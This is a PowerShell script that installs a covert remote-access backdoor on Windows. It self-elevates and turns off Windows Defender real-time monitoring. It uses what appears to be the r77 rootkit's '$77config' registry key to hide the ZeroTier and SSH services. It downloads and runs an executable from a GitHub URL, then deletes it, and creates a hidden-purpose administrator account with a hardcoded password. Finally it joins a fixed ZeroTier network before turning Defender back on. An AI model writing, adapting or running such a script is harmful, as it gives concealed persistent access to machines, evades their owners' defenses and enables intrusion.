# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Download and Install ZeroTier One silently
$zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
$zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait

# Disable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# Define the base path for the $77config
$baseConfigPath = "HKLM:\SOFTWARE\$77config"

# Ensure the $77config key and necessary subkeys exist
$serviceNamesPath = "$baseConfigPath\service_names"
if (-not (Test-Path $serviceNamesPath)) {
    New-Item -Path $serviceNamesPath -Force | Out-Null
}

# Define service names to hide - ZeroTier and SSH service
$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your SSH service name if different

# Hide specified services
foreach ($service in $servicesToHide) {
    New-ItemProperty -Path $serviceNamesPath -Name $service -Value "" -PropertyType String -Force | Out-Null
}

# Define the URL and download location for improved.exe
$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/improved.exe"
$tempFolder = $env:TEMP
$exePath = Join-Path $tempFolder "improved.exe"

# Download improved.exe from the provided URL
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute improved.exe without waiting for completion
Start-Process -FilePath $exePath -Verb RunAs -Wait

# Delete the downloaded improved.exe
Remove-Item $exePath -Force

# Create a new user `ssh-user` with administrative privileges
$userName = "ssh-user"
$password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $userName

# Join the specified ZeroTier network
# Ensure the ZeroTier service is running before attempting to join a network
Start-Service -Name "ZeroTierOneService"
$networkId = "af78bf9436d39eb1" # Replace with your network ID
Start-Sleep -Seconds 5 # Give some time for the ZeroTier service to start
& "C:\ProgramData\ZeroTier\One\zerotier-cli.bat" join $networkId

# Re-enable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $false

Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId."
Write-Host "Windows Defender Antivirus has been re-enabled."
